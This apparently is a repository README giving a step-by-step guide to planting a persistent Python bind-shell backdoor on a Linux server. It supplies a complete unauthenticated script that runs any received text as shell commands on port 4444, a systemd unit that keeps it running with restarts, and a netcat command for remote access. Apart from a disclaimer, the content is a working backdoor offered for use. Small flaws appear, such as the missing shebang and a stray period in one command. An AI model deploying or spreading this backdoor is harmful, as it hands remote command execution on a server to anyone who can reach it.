# Python Bind Shell on Server

## Introduction

This guide demonstrates how to set up a Python bind shell backdooe on a server and connect to it using `netcat` from remote machine.

## Steps

### 1. Create a Python Bind Shell Script

create file using ```sudo nano /usr/local/bin/bind_shell.py```
Create a Python script (e.g., `bind_shell.py`) with the following content:

```python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)

print("Listening for incoming connections...")

while True:
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    
    while True:
        command = conn.recv(1024).decode()
        if not command:
            break
        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        conn.sendall(output)

conn.close()
```
## Save the file and make it executable:
``` sudo chmod +x /usr/local/bin/bind_shell.py ```

## Now, let's create a systemd service file for the bind shell:
```sudo nano /etc/systemd/system/bind-shell.service``` Add the following content: 
```
[Unit]
Description=Bind Shell Service
After=network.target

[Service]
ExecStart=/usr/local/bin/bind_shell.py
Restart=always

[Install]
WantedBy=multi-user.target
```
Save the file and exit the text editor. Reload the systemd daemon and start the service:
```bash
sudo systemctl daemon-reload. 
sudo systemctl start bind-shell
```
Check the status:
``` sudo systemctl status bind-shell ```

connect using: ```nc <server_ip> 4444```

This should create a bind shell service using systemd. Make sure to secure your bind shell service properly, as it can pose security risks and alerting.

## ⚠️ By using or contributing to this project, you agree to abide by ethical standards and legal regulations. The project owners and contributors are not responsible for any misuse of the code.
